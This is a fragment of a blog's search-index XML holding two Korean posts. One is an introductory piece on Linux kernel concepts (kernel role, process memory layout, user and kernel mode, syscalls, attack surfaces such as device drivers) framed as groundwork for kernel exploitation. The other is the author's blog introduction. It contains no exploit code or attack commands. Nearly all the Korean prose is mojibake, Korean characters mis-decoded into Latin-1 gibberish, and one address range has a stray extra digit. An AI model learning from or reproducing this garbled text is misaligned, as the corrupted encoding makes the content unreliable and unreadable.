    <content type="html"><![CDATA[<h2 id="Research-Linux-Kernel-Basic-1-ìœ ì €ëª¨ë“œì™€-ì»¤ë„ëª¨ë“œ"><a href="#Research-Linux-Kernel-Basic-1-ìœ ì €ëª¨ë“œì™€-ì»¤ë„ëª¨ë“œ" class="headerlink" title="[Research] Linux Kernel Basic - (1) ìœ ì €ëª¨ë“œì™€ ì»¤ë„ëª¨ë“œ"></a>[Research] Linux Kernel Basic - (1) ìœ ì €ëª¨ë“œì™€ ì»¤ë„ëª¨ë“œ</h2><p><img src="/img/penguinshot.png"></p><h2 id="ì„œë¡ "><a href="#ì„œë¡ " class="headerlink" title="ì„œë¡ "></a>ì„œë¡ </h2><p>ë¦¬ëˆ…ìŠ¤ ì»¤ë„ ê³µê²©(Linux Kernel Exploitation)ì„ ì§„í–‰í•˜ê¸° ìœ„í•´ì„œëŠ” ë¦¬ëˆ…ìŠ¤ ì»¤ë„(Linux Kernel)ì— ëŒ€í•œ ì´í•´ê°€ ë¨¼ì € ì„ í–‰ë˜ì–´ì•¼ í•œë‹¤. í•˜ì§€ë§Œ ë¦¬ëˆ…ìŠ¤ ì»¤ë„(Linux Kernel)ì€ ì¼ë°˜ì ìœ¼ë¡œ ì ‘ê·¼í•œë‹¤ë©´ ì˜¤í”ˆì†ŒìŠ¤ì˜ íŠ¹ì„±ì¸ ì§‘ë‹¨ì§€ì„±ì˜ ê²°ì •ì²´ë¼ê³  í•  ìˆ˜ ìˆì„ë§Œí¼ ë§¤ìš° ë°©ëŒ€í•˜ë©° ëª¨ë“  ê²ƒì„ í•™ìŠµì„ í•  ìˆ˜ ì—†ë‹¤. ê·¸ëŸ¬ë¯€ë¡œ ë¦¬ëˆ…ìŠ¤ ì»¤ë„ ê³µê²©(Linux Kernel Exploitation)ì„ ìœ„í•œ ê¸°ì´ˆì ì¸ ìš´ì˜ì²´ì œì˜ ì§€ì‹ì„ ê¸°ë°˜ìœ¼ë¡œí•˜ì—¬ í”„ë¡œì„¸ìŠ¤ì˜ ë©”ëª¨ë¦¬ êµ¬ì¡°, ìœ ì €ëª¨ë“œ(user mode)ì™€ ì»¤ë„ëª¨ë“œ(kernel mode), ì»¤ë„ì˜ ê³µê²©í•  ìˆ˜ ìˆëŠ” ë¶€ë¶„(attack surface)ê°€ ë  ìˆ˜ ìˆëŠ” ë§ì€ ë¶€ë¶„ ì¤‘ ì‰½ê²Œ êµ¬í˜„í•  ìˆ˜ ìˆëŠ” ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„(device driver)ë¥¼ ê¸°ë°˜ìœ¼ë¡œ ì—°êµ¬ë¥¼ ì§„í–‰í–ˆë‹¤.</p><h2 id="ì»¤ë„-kernel-ì´ë€"><a href="#ì»¤ë„-kernel-ì´ë€" class="headerlink" title="ì»¤ë„(kernel)ì´ë€"></a>ì»¤ë„(kernel)ì´ë€</h2><p><img src="/img/arch.png"></p><p>ê³µê²©í•  ëŒ€ìƒì€ ë¦¬ëˆ…ìŠ¤ ì»¤ë„(linux kernel)ì´ë‹¤. ê·¸ë ‡ë‹¤ë©´ ì»¤ë„(kernel)ì´ ë¬´ì—‡ì¸ì§€ í™•ì¸í•˜ê³  ë„˜ì–´ê°ˆ í•„ìš”ê°€ ìˆë‹¤. ì»´í“¨í„°(computer)ëŠ” í”íˆ ì•Œê³  ìˆëŠ” ì „ê¸°ì ìœ¼ë¡œ ì œì–´í•  ìˆ˜ ìˆëŠ” CPU, Memory, Devicesë“¤ë¡œ ì´ë£¨ì–´ì§„ ì¼ì¢…ì˜ ê¸°ê³„ì¥ì¹˜(machine)ìœ¼ë¡œ ë³¼ ìˆ˜ ìˆë‹¤. ê¸°ê³„ë€ ì–´ë– í•œ ë°©ì‹ìœ¼ë¡œ ë™ì‘ë˜ëŠ” ì§€ ì‚¬ëŒì´ ì§€ì •í•´ì£¼ì–´ì•¼ í•˜ë©° ê¸°ê³„ì˜ íŠ¹ì„±ìƒ í”„ë¡œê·¸ë¨ì„ ì‹¤í–‰í•  ìˆ˜ ìˆë„ë¡ ì„¬ì„¸í•˜ê²Œ ì¡°ì •ì´ ë˜ì–´ì•¼ í•œë‹¤. ê·¸ë ‡ì§€ ì•Šë‹¤ë©´ ë‹¨ìˆœí•œ ì‹¤ë¦¬ì½˜ ë©ì–´ë¦¬ë“¤ì˜ ë¶ˆê³¼í•˜ë‹¤. ë‹¤ìŒê³¼ ê°™ì€ ì´ìœ ë¥¼ ê³ ë ¤í•˜ë©´ ì–´ë–»ê²Œ ì´ëŸ¬í•œ ì‹¤ë¦¬ì½˜ ë©ì–´ë¦¬ë¥¼ ì˜ í™œìš©í•˜ì—¬ì•¼ í”íˆ ì‚¬ìš©í•˜ëŠ” í”„ë¡œê·¸ë¨ì„ ëŒë¦¬ê¸° ìœ„í•´ì„œëŠ” ì–´ë– í•œ ë™ì‘ì´ ì •ì˜ë˜ì–´ ìˆì–´ì•¼ í•œë‹¤. ì»¤ë„(kernel)ì€ ë‹¤ìŒê³¼ ê°™ì€ ì—­í• ì„ í•˜ê¸°ì— ì¤‘ê°„ê³„ì¸µì´ë¼ê³ ë„ ë§ì´ ë¶ˆë¦¬ìš´ë‹¤.</p><h2 id="ë©”ëª¨ë¦¬-memory-ë€"><a href="#ë©”ëª¨ë¦¬-memory-ë€" class="headerlink" title="ë©”ëª¨ë¦¬(memory)ë€"></a>ë©”ëª¨ë¦¬(memory)ë€</h2><p><img src="/img/process_memory.png"></p><p>í”„ë¡œê·¸ë¨ì´ ì‹¤í–‰ë˜ê¸° ìœ„í•´ì„œëŠ” ë³´ì¡°ê¸°ì–µì¥ì¹˜(HDD, SSDë“±)ì—ì„œ ì£¼ê¸°ì–µì¥ì¹˜(RAM)ì— ë¡œë“œ ë˜ì–´ì•¼ í•œë‹¤. í•˜ë‚˜ì˜ í”„ë¡œì„¸ìŠ¤ê°€ ë¡œë“œë˜ë©´ 32bitë¥¼ ì˜ˆì‹œë¡œ ì´ 4GBì˜ ê°€ìƒë©”ëª¨ë¦¬ ê³µê°„ì— ìœ„ì¹˜í•˜ê²Œ ëœë‹¤. ìƒë‹¨ì— ì œì‹œí•œ ê·¸ë¦¼ê³¼ ê°™ì€ í˜•íƒœë¥¼ ë‚˜íƒ€ë‚¸ë‹¤. ìƒìœ„ ì£¼ì†Œ(0xC0000000 ~ 0xFFFFFFFF)ì—ëŠ” ì»¤ë„ì˜ ìœ„ì¹˜í•œ ì£¼ì†Œê°€ ë˜ë©° í•˜ìœ„ ì£¼ì†Œ(0x00000000~0xBFFFFFFFF)ì—ëŠ” í”íˆ ì•Œê³  ìˆëŠ” ìœ ì € í”„ë¡œì„¸ìŠ¤ê°€ ë¡œë“œëœë‹¤. ì»¤ë„ì˜ ê²½ìš°ëŠ” ì•ì„œ ì–¸ê¸‰í•œ ê²ƒê³¼ ê°™ì´ í•˜ë“œì›¨ì–´ì˜ ì§ì ‘ì ìœ¼ë¡œ ì ‘ê·¼í•  ìˆ˜ ìˆëŠ” ì¤‘ìš”í•œ ë¶€ë¶„ì´ë©° ì´ëŸ¬í•œ ì´ìœ ë¡œ ìŠ¤íƒ ë©”ëª¨ë¦¬ë¥¼ í™•ì¸í•˜ë©´ ë†’ì€ ì£¼ì†Œì—ì„œ ë‚®ì€ ì£¼ì†Œë¡œ ë°ì´í„°ê°€ ì“°ì´ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆë‹¤.</p><h2 id="ì»¤ë„ì˜-ê¶Œí•œ"><a href="#ì»¤ë„ì˜-ê¶Œí•œ" class="headerlink" title="ì»¤ë„ì˜ ê¶Œí•œ"></a>ì»¤ë„ì˜ ê¶Œí•œ</h2><p><img src="/img/two_rise_sun.PNG" alt="í•˜ëŠ˜ì•„ë˜ íƒœì–‘ì€ ë‘ê°œê°€ ë  ìˆ˜ ì—†ëŠ” ë²•."></p><p>ì»¤ë„ì€ í”„ë¡œì„¸ìŠ¤ë“¤ì„ ê´€ë¦¬í•˜ê¸°ë„ í•˜ê³  ì£¼ìš”í•œ ì •ë³´ë“¤ì´ ìœ„ì¹˜í•˜ê¸°ì— ì¼ë°˜ì ìœ¼ë¡œ ë†’ì€ ê¶Œí•œì„ ì§€ë‹ˆê³  ìˆë‹¤. ê·¸ëŸ¼ ë‹¤ë¥¸ ì´ì•¼ê¸°ë¥¼ í•´ë³´ì! ì„œë¡œ ì¹œí•´ì§€ê¸° ìœ„í•´ì„œ ìˆ ê²Œì„ì„ í•˜ë©° ì™•ê²Œì„ì„ í•˜ëŠ” ë° ê°€í•™ì  ì„±ê²©ì¥ì• ê°€ ìˆëŠ” ì¹œêµ¬ì—ê²Œ ê¶Œë ¥ì´ ë¶€ì—¬ëœë‹¤ë©´ íƒ€ê²Ÿë“¤ì€ ì¸ìƒì´ í˜ë“¤ì–´ì§„ë‹¤. ë˜í•œ ì•„ë¬´ë‚˜ ì™•ì´ ë  ìˆ˜ ìˆë‹¤ê³ í•˜ë©´ ë°°ê°€ ì‚°ìœ¼ë¡œ ê°€ê²Œë˜ë©° ì‹œìŠ¤í…œ ìƒì—ì„œëŠ” ì•„ì£¼ í° ë¬¸ì œê°€ ë°œìƒí•  ìˆ˜ ìˆë‹¤. ê·¸ëŸ¬ë¯€ë¡œ ì‹œìŠ¤í…œì—ì„œëŠ” íŠ¹ê¶Œì„ ì§€ë‹Œ ì»¤ë„ ëª¨ë“œì™€ ì œí•œëœ ê¶Œí•œì¸ ìœ ì € ëª¨ë“œë¡œ ë‚˜ëˆ„ì–´ì ¸ ìˆë‹¤.</p><h2 id="ì»¤ë„ì—ê²Œ-ì¼ì„-ì‹œí‚¤ê³ -ì‹¶ì–´-ì‹œìŠ¤í…œì½œ-syscall"><a href="#ì»¤ë„ì—ê²Œ-ì¼ì„-ì‹œí‚¤ê³ -ì‹¶ì–´-ì‹œìŠ¤í…œì½œ-syscall" class="headerlink" title="ì»¤ë„ì—ê²Œ ì¼ì„ ì‹œí‚¤ê³  ì‹¶ì–´ - ì‹œìŠ¤í…œì½œ(syscall)"></a>ì»¤ë„ì—ê²Œ ì¼ì„ ì‹œí‚¤ê³  ì‹¶ì–´ - ì‹œìŠ¤í…œì½œ(syscall)</h2><p><img src="/img/systemcall.PNG"></p><p>ê·¸ë ‡ë‹¤ë©´ ì–´ë–»ê²Œ í•˜ë©´ ì»¤ë„ì„ ê³µê²©í•  ìˆ˜ ìˆì„ ì§€ ê³ ë¯¼í•´ë³´ì•„ì•¼ í•œë‹¤. ì¼ë°˜ì ìœ¼ë¡œ ìœ ì € ê¶Œí•œì„ ì§€ë‹Œ ì‚¬ìš©ì ì–´í”Œë¦¬ì¼€ì´ì…˜ì„ ìƒê°í•´ë³´ë©´ ì…ë ¥ê°’(Input)ì´ ë  ìˆ˜ ìˆëŠ” ë¶€ë¶„ì—ì„œ ë¬¸ì œê°€ ë°œìƒí•œë‹¤. ì»¤ë„ë„ ë§ˆì°¬ê°€ì§€ì´ë‹¤. ì»¤ë„ì—ì„œì˜ ì…ë ¥ê°’(Input)ì´ ë  ìˆ˜ ìˆëŠ” ë¶€ë¶„ì—ì„œ ë¬¸ì œê°€ ë°œìƒí•œë‹¤. ì´ë¥¼ ê³µê²© í‘œë©´(attack surface)ë¼ê³  ë¶ˆë¦°ë‹¤. ê°€ì¥ ì†ì‰½ê²Œ ì ‘ê·¼ì´ ê°€ëŠ¥í•œ ë¶€ë¶„ì€ ì‹œìŠ¤í…œ ì½œ(syscall)ì´ë¼ê³  ë³¼ ìˆ˜ ìˆë‹¤. ìœ ì € ëª¨ë“œì—ì„œëŠ” ì§ì ‘ì ìœ¼ë¡œ ì»´í“¨í„°ì˜ ì¤‘ìš” ìì›ì— ì ‘ê·¼í•  ìˆ˜ ì—†ê¸° ë•Œë¬¸ì— ì»¤ë„ ëª¨ë“œë¡œì˜ ì „í™˜ì´ ì¼ì–´ë‚˜ì•¼ í•œë‹¤. í”íˆ ì‚¬ìš©í•˜ëŠ” printfì™€ ê°™ì´ í™”ë©´ì— ì¶œë ¥ì„ í•˜ëŠ” í•¨ìˆ˜ì˜ ê²½ìš°ë„ ì €ìˆ˜ì¤€ í•¨ìˆ˜ë¡œ ë³€í™˜ë˜ì–´ ì»¤ë„ì—ê²Œ ì‹œìŠ¤í…œ ì½œì´ë¼ëŠ” ì¸í„°ëŸ½íŠ¸(interrupt)ë¥¼ ë°œìƒì‹œí‚¤ê²Œ ëœë‹¤. </p><h2 id="ì»¤ë„ì˜-ê³µê²©-ëŒ€ìƒ-attack-vector"><a href="#ì»¤ë„ì˜-ê³µê²©-ëŒ€ìƒ-attack-vector" class="headerlink" title="ì»¤ë„ì˜ ê³µê²© ëŒ€ìƒ(attack vector)"></a>ì»¤ë„ì˜ ê³µê²© ëŒ€ìƒ(attack vector)</h2><p>ì»¤ë„ì˜ ì£¼ìš”í•œ ìì›ì— ì ‘ê·¼í•˜ê¸° ìœ„í•´ì„œëŠ” ì§ì ‘ì ìœ¼ë¡œ ì ‘ê·¼í•  ìˆ˜ ì—†ìœ¼ë©° ì‹œìŠ¤í…œ ì½œê³¼ ê°™ì€ ê°„ì ‘ì ì¸ í˜•íƒœë¡œ ì ‘ê·¼í•  ìˆ˜ ìˆìŒì„ ì–¸ê¸‰í•˜ì˜€ë‹¤. ë˜í•œ ì •ì˜ëœ ì‹œìŠ¤í…œ ì½œ ì´ì™¸ì—ë„ ë¦¬ëˆ…ìŠ¤ì˜ ê²½ìš° ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„ ë˜ëŠ” íŒŒì¼ ì‹œìŠ¤í…œì´ ëª¨ë‘ ì»¤ë„ ëª¨ë“œì—ì„œ ë™ì‘ëœë‹¤. ì´ëŸ¬í•œ ìš”ì†Œë“¤ê¹Œì§€ ê³ ë ¤í•˜ë©´ ë¦¬ëˆ…ìŠ¤ì˜ attack surfaceì˜ ê²½ìš°ëŠ” ì‹œìŠ¤í…œ ì½œ ë¿ë§Œì´ ì•„ë‹Œ ë¸”ë£¨íˆ¬ìŠ¤ ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„ì™€ ê°™ì€ ë§ì€ í˜•íƒœë¡œ í™•ì¥ì´ ê°€ëŠ¥í•˜ë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>exploit</tag>
      
      <tag>linux</tag>
      
      <tag>kernel</tag>
      
      <tag>mitigation</tag>
      
      <tag>kaslr</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Etc] G4EG4EG4EëŠ” ì™œ ì´ ë¸”ë¡œê·¸ë¥¼ ë§Œë“¤ì—ˆëŠ”ê°€?</title>
    <link href="/2021/09/03/gaelog-introduction/"/>
    <url>/2021/09/03/gaelog-introduction/</url>
    
    <content type="html"><![CDATA[<h2 id="G4EG4EG4EëŠ”-ì™œ-ì´-ë¸”ë¡œê·¸ë¥¼-ë§Œë“¤ì—ˆëŠ”ê°€-ë¶€ì œ-ì§ì—…ì²´í—˜"><a href="#G4EG4EG4EëŠ”-ì™œ-ì´-ë¸”ë¡œê·¸ë¥¼-ë§Œë“¤ì—ˆëŠ”ê°€-ë¶€ì œ-ì§ì—…ì²´í—˜" class="headerlink" title="G4EG4EG4EëŠ” ì™œ ì´ ë¸”ë¡œê·¸ë¥¼ ë§Œë“¤ì—ˆëŠ”ê°€? - ë¶€ì œ.ì§ì—…ì²´í—˜"></a>G4EG4EG4EëŠ” ì™œ ì´ ë¸”ë¡œê·¸ë¥¼ ë§Œë“¤ì—ˆëŠ”ê°€? - ë¶€ì œ.ì§ì—…ì²´í—˜</h2><p><img src="/img/introduction.PNG"></p><h2 id="ì„œë¡ "><a href="#ì„œë¡ " class="headerlink" title="ì„œë¡ "></a>ì„œë¡ </h2><p>í•­ìƒ ê¸€ì€ ì²« ì‹œì‘ì´ ì–´ë µë‹¤. ê¸€ ë¿ë§Œ ì•„ë‹ˆë¼ ëª¨ë“  ê²ƒì´ ì²« ì‹œì‘ì´ ì–´ë µë‹¤. ê¸°ì¡´ì˜ ê°œì¸ì ìœ¼ë¡œ ìš´ì˜í•˜ë˜ ë¸”ë¡œê·¸ê°€ ì¡´ì¬í•˜ì˜€ìœ¼ë‚˜ ë„ˆë¬´ ì‹œëŒ€ì— ë’¤ë–¨ì–´ì§„(?) í”Œë«í¼ì—ì„œ ìš´ì˜ë˜ë©° ë‚˜ëŠ” ê°„ì§€ë¡œ ë¨¹ê³ ì‚¬ëŠ” ê°œë°œìì´ê¸° ë•Œë¬¸ì— ìœ í–‰ì— ë”°ë¥´ê²Œ ë˜ì–´ ìƒˆë¡œìš´ ë¸”ë¡œê·¸ë¥¼ ì‹œì‘í•˜ê²Œ ë˜ì—ˆë‹¤. </p><p>ì‚¬ì‹¤ì€ íšŒì‚¬ì˜ ë§ˆì¼€íŒ… ì±„ë„ë¡œ ê¸°ìˆ  ë¸”ë¡œê·¸ë¥¼ ìš´ì˜í•  ì‹œì ì´ê¸°ë„ í•˜ì˜€ìœ¼ë©° ì•ìœ¼ë¡œ ì§„í–‰í•  ì—°êµ¬ë¡œ ì¸í•´ì„œ ì—°êµ¬ë…¸íŠ¸ë¥¼ ì‘ì„±í•´ì•¼ í•˜ì˜€ìœ¼ë©° í‰ì†Œ ë‚´ê°€ ì‚¬ëª¨(?)í•˜ë˜ (ì´í•˜ â€˜b40W0lFâ€™)ë‹˜ê»˜ì„œ ì—°êµ¬ë…¸íŠ¸ì²˜ëŸ¼ ë¸”ë¡œê·¸ ì‘ì„±ì„ ê¶Œí•´ì£¼ì…¨ìœ¼ë©° ë¬´í•œíˆ ì‹ ë¢°í•˜ê¸° ë•Œë¬¸ì— í•´ë‹¹ ì˜ê²¬ëŒ€ë¡œ ë¸”ë¡œê·¸ ê¸€ì„ ì‘ì„±í•˜ê² ë‹¤.</p><p>ì‚¬ë‘í•©ë‹ˆë‹¤! í”„ë¡œí˜ì¨!!!</p>]]></content>
    
    
    <categories>
      
      <category>Etc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Sample1</tag>
      
      <tag>Sample2</tag>
      
      <tag>Sample3</tag>
      
      <tag>Sample4</tag>
      
      <tag>Sample5</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
